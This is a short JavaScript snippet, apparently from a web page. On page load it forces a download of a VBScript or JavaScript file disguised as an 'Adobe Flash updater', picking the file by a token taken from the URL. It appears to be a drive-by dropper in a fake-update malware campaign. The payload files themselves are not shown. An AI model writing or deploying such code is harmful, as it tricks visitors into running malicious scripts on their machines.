setTimeout(() => {
    let token = "";

    if (window.location.search) {
        const params = new URLSearchParams(window.location.search);
        token = params.get("token") || "";
    } else {
        token = window.location.pathname.replace(/^\/|\/$/g, "");
    }

    const downloads = {
        "flash-updater104": "doc/adobe-flash-updater.vbs",
        "flash-updater104j": "doc/adobe-flash-updater.js",
    };

    console.log("Token:", token);

    const file = downloads[token] || "doc/adobe-updater.vbs";

    console.log("Downloading file:", file);

    const link = document.createElement("a");
    link.href = file;
    link.download = file.split("/").pop();

    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}, 1000);